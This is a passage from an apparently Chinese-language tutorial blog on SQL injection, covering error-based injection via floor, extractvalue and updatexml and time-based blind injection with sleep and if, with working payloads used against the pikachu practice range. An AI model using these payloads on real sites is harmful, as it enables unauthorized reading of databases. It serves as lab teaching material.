class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span>查询数据<br>在网站应用中进行数据显示 查询 操作<br>例: <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>$id<br><br><span class="hljs-keyword">insert</span>插入数据<br>在网站应用中进行用户 注册 添加 等操作<br>例: <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> news (id, url,text) <span class="hljs-keyword">values</span> ( <span class="hljs-number">2</span>，<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;$t&#x27;</span>)<br><br><span class="hljs-keyword">delete</span>删除数据<br>后台管理里面删除文章 删除 用户等操作<br>例: <span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>$id<br><br><span class="hljs-keyword">update</span> 更新 数据<br>会员或后台中心数据同步或缓存等操作<br>例: <span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> pwd<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$p&#x27;</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">and</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27; admin&#x27;</span><br><br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> 排序 数据<br>一般结合表名或列名进行数据排序操作<br>例: <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> $id<br>例: <span class="hljs-keyword">select</span> id , name , price <span class="hljs-keyword">from</span> news <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> $<span class="hljs-keyword">order</span><br></code></pre></td></tr></table></figure><h1 id="什么是盲注？"><a href="#什么是盲注？" class="headerlink" title="什么是盲注？"></a>什么是盲注？</h1><p><strong>盲注</strong>就是在注入过程中，获取的数据不能回显至前端页面。</p><p>此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>、基于布尔的<span class="hljs-keyword">sQL</span>盲注<span class="hljs-operator">-</span>逻辑判断 regexp, <span class="hljs-keyword">like</span> , ascii,<span class="hljs-keyword">left</span>, ord , mid<br><span class="hljs-number">2</span>、基于时间的<span class="hljs-keyword">sQL</span>盲注<span class="hljs-operator">-</span>延时判断 if ,sleep<br><span class="hljs-number">3</span>、基于报错的<span class="hljs-keyword">sQL</span>盲注<span class="hljs-operator">-</span>报错回显 floor, updatexml, extractvalue <br></code></pre></td></tr></table></figure><h1 id="1、报错盲注"><a href="#1、报错盲注" class="headerlink" title="1、报错盲注"></a>1、报错盲注</h1><p>参考地址：<a href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a>     <a href="https://developer.aliyun.com/article/692723">https://developer.aliyun.com/article/692723</a></p><p>常见的报错注入如下：</p><p>1、通过<strong>floor报错注入</strong>语句如下:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> count(*),concat(version(),floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a);<br></code></pre></td></tr></table></figure><p>2、通过<strong>ExtractValue报错注入</strong>语句如下:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x5c</span>, (<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>)));<br></code></pre></td></tr></table></figure><p>3、通过<strong>UpdateXml报错注入</strong>语句如下:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">and <span class="hljs-number">1</span>=(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x3a,(<span class="hljs-name">select</span> user())),<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><h2 id="报错注入：extractvalue、updatexml报错原理"><a href="#报错注入：extractvalue、updatexml报错原理" class="headerlink" title="报错注入：extractvalue、updatexml报错原理"></a>报错注入：extractvalue、updatexml报错原理</h2><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：extractvalue、updatexml</p><table><thead><tr><th align="left">名称</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_extractvalue"><code>ExtractValue()</code></a></td><td align="left">使用XPath表示法从XML字符串中提取值</td></tr><tr><td align="left"><a href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_updatexml"><code>UpdateXML()</code></a></td><td align="left">返回替换的XML片段</td></tr></tbody></table><p>通过这两个函数可以完成报错注入</p><h3 id="一、extractvalue函数"><a href="#一、extractvalue函数" class="headerlink" title="一、extractvalue函数"></a>一、extractvalue函数</h3><p><a href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_extractvalue"><code>ExtractValue(xml_frag, xpath_expr)</code></a></p><p><a href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_extractvalue"><code>ExtractValue()</code></a>接受两个字符串参数，一个XML标记片段  <em>xml_frag</em> 和一个XPath表达式 <em>xpath_expr</em>（也称为 定位器）; 它返回<code>CDATA</code>第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。</p><p>第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径</p><p>例如：<code>SELECT ExtractValue(&#39;&lt;a&gt;&lt;b&gt;&lt;b/&gt;&lt;/a&gt;&#39;, &#39;/a/b&#39;);</code> 就是寻找前一段xml文档内容中的a节点下的b节点，<strong>这里如果Xpath格式语法书写错误的话，就会报错</strong>。这里就是利用这个特性来获得我们想要知道的内容。</p><p><img src="https://s2.loli.net/2022/11/25/UGXeuI1EJyalMD7.png" alt="1551927935215"><br>（这里我们是为了学习报错注入，所以不需要太详细的知道该函数具体原理）</p><p>利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。<br><img src="https://s2.loli.net/2022/11/25/tb2cABY3wdDN4zS.png" alt="1551928141656"></p><h3 id="二、updatexml函数"><a href="#二、updatexml函数" class="headerlink" title="二、updatexml函数"></a>二、updatexml函数</h3><p><a href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_updatexml"><code>UpdateXML(xml_target, xpath_expr, new_xml)</code></a></p><p><strong>xml_target:：</strong> 需要操作的xml片段</p><p><strong>xpath_expr：</strong> 需要更新的xml路径(Xpath格式)</p><p><strong>new_xml：</strong> 更新后的内容</p><p>此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为 <em>xml_target</em> 新的XML片段 <em>new_xml</em> ，然后返回更改的XML。<em>xml_target</em>替换的部分 与<em>xpath_expr</em> 用户提供的XPath表达式匹配。</p><p>如果未<em>xpath_expr</em>找到表达式匹配 ，或者找到多个匹配项，则该函数返回原始 <em>xml_target</em>XML片段。所有三个参数都应该是字符串。使用方式如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml">mysql&gt; SELECT<br>    -&gt;   UpdateXML(&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>ccc<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">d</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">d</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>&#x27;, &#x27;/a&#x27;, &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">e</span>&gt;</span>fff<span class="hljs-tag">&lt;/<span class="hljs-name">e</span>&gt;</span>&#x27;) AS val1,<br>    -&gt;   UpdateXML(&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>ccc<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">d</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">d</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>&#x27;, &#x27;/b&#x27;, &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">e</span>&gt;</span>fff<span class="hljs-tag">&lt;/<span class="hljs-name">e</span>&gt;</span>&#x27;) AS val2,<br>    -&gt;   UpdateXML(&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>ccc<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">d</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">d</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>&#x27;, &#x27;//b&#x27;, &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">e</span>&gt;</span>fff<span class="hljs-tag">&lt;/<span class="hljs-name">e</span>&gt;</span>&#x27;) AS val3,<br>    -&gt;   UpdateXML(&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>ccc<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">d</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">d</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>&#x27;, &#x27;/a/d&#x27;, &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">e</span>&gt;</span>fff<span class="hljs-tag">&lt;/<span class="hljs-name">e</span>&gt;</span>&#x27;) AS val4,<br>    -&gt;   UpdateXML(&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">d</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">d</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>ccc<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">d</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">d</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>&#x27;, &#x27;/a/d&#x27;, &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">e</span>&gt;</span>fff<span class="hljs-tag">&lt;/<span class="hljs-name">e</span>&gt;</span>&#x27;) AS val5<br>    -&gt; \G<br>***********结果**************<br>val1: <span class="hljs-tag">&lt;<span class="hljs-name">e</span>&gt;</span>fff<span class="hljs-tag">&lt;/<span class="hljs-name">e</span>&gt;</span><br>val2: <span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>ccc<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">d</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">d</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>val3: <span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">e</span>&gt;</span>fff<span class="hljs-tag">&lt;/<span class="hljs-name">e</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">d</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">d</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>val4: <span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>ccc<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">e</span>&gt;</span>fff<span class="hljs-tag">&lt;/<span class="hljs-name">e</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>val5: <span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">d</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">d</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>ccc<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">d</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">d</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里和上面的extractvalue函数一样，当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容：</p><p><img src="https://s2.loli.net/2022/11/25/SYc6xFvea47qd5M.png" alt="1551929714141"></p><h2 id="pikachu靶场-insert、update、delete注入"><a href="#pikachu靶场-insert、update、delete注入" class="headerlink" title="pikachu靶场 insert、update、delete注入"></a>pikachu靶场 insert、update、delete注入</h2><h3 id="1、insert"><a href="#1、insert" class="headerlink" title="1、insert"></a>1、insert</h3><h4 id="使用updatexml（）"><a href="#使用updatexml（）" class="headerlink" title="使用updatexml（）"></a>使用<strong>updatexml（）</strong></h4><img src="https://s2.loli.net/2022/11/25/pRjA37yBvLV2hE1.png" alt="image-20221113142457957" style="zoom:33%;" /><p>使用bp抓包</p><img src="https://s2.loli.net/2022/11/25/3qFsSpfeNx2IicD.png" alt="image-20221113142543178" style="zoom: 33%;" /><p>然后使用updatexml进行报错注入</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-string">&#x27; or updatexml(0,concat(&#x27;</span>~<span class="hljs-string">&#x27;,version(),&#x27;</span>~<span class="hljs-string">&#x27;),0) or &#x27;</span>查询数据库版本<br><span class="hljs-string">&#x27; or updatexml(0,concat(&#x27;</span>~<span class="hljs-string">&#x27;,user(),&#x27;</span>~<span class="hljs-string">&#x27;),0) or &#x27;</span>查询用户<br><span class="hljs-string">&#x27; or updatexml(0,concat(&#x27;</span>~<span class="hljs-string">&#x27;,database(),&#x27;</span>~<span class="hljs-string">&#x27;),0) or &#x27;</span>查询数据库<br>字符型注意 将前后的 <span class="hljs-string">&#x27; 闭合，使用 or或and连接</span><br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/11/25/1W4iATn8bmrwSVc.png" alt="image-20221113142848230" style="zoom: 33%;" /><h4 id="使用extractvalue（）"><a href="#使用extractvalue（）" class="headerlink" title="使用extractvalue（）"></a>使用extractvalue（）</h4><p>先抓包，</p><p>然后写入语句   0x7e 代表 ~</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&#x27; <span class="hljs-keyword">or</span> <span class="hljs-keyword">extractvalue</span>(<span class="hljs-number">0</span><span class="hljs-punctuation">,</span>(concat(<span class="hljs-string">&quot;~&quot;</span><span class="hljs-punctuation">,</span>version()<span class="hljs-punctuation">,</span><span class="hljs-string">&quot;~&quot;</span>))) <span class="hljs-keyword">or</span> &#x27;<br>&#x27; <span class="hljs-keyword">or</span> <span class="hljs-keyword">extractvalue</span>(<span class="hljs-number">0</span><span class="hljs-punctuation">,</span>(concat(<span class="hljs-string">&quot;~&quot;</span><span class="hljs-punctuation">,</span>user()<span class="hljs-punctuation">,</span><span class="hljs-string">&quot;~&quot;</span>))) <span class="hljs-keyword">or</span> &#x27;<br>&#x27; <span class="hljs-keyword">or</span> <span class="hljs-keyword">extractvalue</span>(<span class="hljs-number">0</span><span class="hljs-punctuation">,</span>(concat(<span class="hljs-string">&quot;~&quot;</span><span class="hljs-punctuation">,</span>database()<span class="hljs-punctuation">,</span><span class="hljs-string">&quot;~&quot;</span>))) <span class="hljs-keyword">or</span> &#x27;<br>&#x27; <span class="hljs-keyword">or</span> <span class="hljs-keyword">extractvalue</span>(<span class="hljs-number">0</span><span class="hljs-punctuation">,</span>(concat(<span class="hljs-string">&quot;~&quot;</span><span class="hljs-punctuation">,</span>@<span class="hljs-title">@version_compile_os</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;~&quot;</span>))) <span class="hljs-keyword">or</span> &#x27;<br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/11/25/k2vjOzKXmiVJL6t.png" alt="image-20221113143226334" style="zoom:33%;" /><img src="https://s2.loli.net/2022/11/25/JwfHWyLDcgaz61u.png" alt="image-20221113143330551" style="zoom:33%;" /><p>与updatexml类似</p><h4 id="使用floor"><a href="#使用floor" class="headerlink" title="使用floor"></a>使用floor</h4><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs q">&#x27; <span class="hljs-built_in">or</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> concat(<span class="hljs-number">0x7e</span>,version(),<span class="hljs-number">0x7e</span>)))<br><span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x)a) <span class="hljs-built_in">or</span> &#x27; <br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/11/25/eEipvbyQnatCsWI.png" alt="image-20221113143954097" style="zoom: 50%;" /><h3 id="2、update"><a href="#2、update" class="headerlink" title="2、update"></a>2、update</h3><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sml"><span class="hljs-symbol">&#x27;or</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,database<span class="hljs-literal">()</span>,<span class="hljs-number">0x7e</span>),<span class="hljs-number">0</span>) or&#x27;<br></code></pre></td></tr></table></figure><p>原理类似</p><h3 id="3、delete"><a href="#3、delete" class="headerlink" title="3、delete"></a>3、delete</h3><img src="https://s2.loli.net/2022/11/25/agOqpu1FC6VRTED.png" alt="image-20221113144903429" style="zoom:33%;" /><p>此处id为数字，所以不用引号闭合</p><p>delete语句：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id=xx<br></code></pre></td></tr></table></figure><p><strong>updatexml</strong>:</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">or</span> <span class="hljs-selector-tag">updatexml</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,<span class="hljs-built_in">version</span>()),<span class="hljs-number">1</span>)<br>在<span class="hljs-selector-tag">bp</span>中不能使用空格，使用 + 、%<span class="hljs-number">20</span> 代表空格，浏览器将解码为空格<br><span class="hljs-selector-tag">or</span>+<span class="hljs-selector-tag">updatexml</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,<span class="hljs-built_in">version</span>()),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><strong>0x7e</strong>这个十六进制数代表符号<del>，**</del>**这个符号在xpath语法中是不存在的，因此总能报错</p><p><strong>extractvalue</strong></p><img src="https://s2.loli.net/2022/11/25/g5kj8eXvoQREIwC.png" alt="image-20221113145720404" style="zoom:33%;" /><h1 id="2、时间盲注"><a href="#2、时间盲注" class="headerlink" title="2、时间盲注"></a>2、时间盲注</h1><p>在页面不回显时，使用时间盲注，根据响应时间判断相关注入</p><h2 id="1、sleep语句"><a href="#1、sleep语句" class="headerlink" title="1、sleep语句"></a>1、sleep语句</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">member</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">----+----------+----------------------------------+-------+----------+---------+--------+</span><br><span class="hljs-operator">|</span> id <span class="hljs-operator">|</span> username <span class="hljs-operator">|</span> pw                               <span class="hljs-operator">|</span> sex   <span class="hljs-operator">|</span> phonenum <span class="hljs-operator">|</span> address <span class="hljs-operator">|</span> email  <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+----------+----------------------------------+-------+----------+---------+--------+</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> vince    <span class="hljs-operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="hljs-operator">|</span> admin <span class="hljs-operator">|</span> asdasd   <span class="hljs-operator">|</span> 四川    <span class="hljs-operator">|</span> 成都   <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+----------+----------------------------------+-------+----------+---------+--------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br>mysql<span class="hljs-operator">&gt;</span><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">member</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">5</span>);<br><span class="hljs-keyword">Empty</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">5.00</span> sec)<br><br>mysql<span class="hljs-operator">&gt;</span><br><br></code></pre></td></tr></table></figure><p>sleep（5）说明睡眠5秒</p><h2 id="2、if语句"><a href="#2、if语句" class="headerlink" title="2、if语句"></a>2、if语句</h2><p>类似于 <strong>三目运算符</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> if(database()<span class="hljs-operator">=</span><span class="hljs-string">&#x27;pikachu&#x27;</span>,<span class="hljs-number">123</span>,<span class="hljs-number">456</span>);<br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------+</span><br><span class="hljs-operator">|</span> if(database()<span class="hljs-operator">=</span><span class="hljs-string">&#x27;pikachu&#x27;</span>,<span class="hljs-number">123</span>,<span class="hljs-number">456</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------+</span><br><span class="hljs-operator">|</span>                              <span class="hljs-number">123</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> if(database()<span class="hljs-operator">=</span><span class="hljs-string">&#x27;test&#x27;</span>,<span class="hljs-number">123</span>,<span class="hljs-number">456</span>);<br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------------------+</span><br><span class="hljs-operator">|</span> if(database()<span class="hljs-operator">=</span><span class="hljs-string">&#x27;test&#x27;</span>,<span class="hljs-number">123</span>,<span class="hljs-number">456</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------------------+</span><br><span class="hljs-operator">|</span>                           <span class="hljs-number">456</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>mysql<span class="hljs-operator">&gt;</span><br><br></code></pre></td></tr></table></figure><h2 id="3、if-sleep"><a href="#3、if-sleep" class="headerlink" title="3、if+sleep"></a>3、if+sleep</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">member</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sleep(if(database()<span class="hljs-operator">=</span><span class="hljs-string">&#x27;pikachu&#x27;</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>));<br><span class="hljs-keyword">Empty</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">5.00</span> sec)<br><br>mysql<span class="hljs-operator">&gt;</span><br><br></code></pre></td></tr></table></figure><p>语句的意思就是如果数据库是pikachu就延迟5秒输出，不是的话就立即返回，</p><p>但是在实际渗透过程中由于受到网络的影响时间注入不是很靠谱，</p><h2 id="参考函数"><a href="#参考函数" class="headerlink" title="参考函数"></a>参考函数</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql">参考:<br><span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;ros&#x27;</span>#判断ro或ro...是否成立<br>regexp <span class="hljs-string">&#x27;^xiaodi [a-z]&#x27;</span>#匹配xiaodi及xiaodi...等if(条件,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>)<br>sleep (<span class="hljs-number">5</span>)#<span class="hljs-keyword">sQL</span>语句延时执行s秒<br>mid (a, b, c)#从位置b开始，截取a字符串的c位<br>substr( a,b, c)#从b位置开始，截取字符串a的c长度<br><span class="hljs-keyword">left</span> (database(),<span class="hljs-number">1</span>), database() #<span class="hljs-keyword">left</span>(a,b)从左侧截取a的前b位<br>length(database ())<span class="hljs-operator">=</span><span class="hljs-number">8</span>#判断数据库database ()名的长度<br>ord、ascii ascii(x)<span class="hljs-operator">=</span><span class="hljs-number">97</span> #判断x的ascii码是否等于<span class="hljs-number">97</span><br><br></code></pre></td></tr></table></figure><p>mysql 索引是从1开始的</p><h1 id="3、布尔盲注"><a href="#3、布尔盲注" class="headerlink" 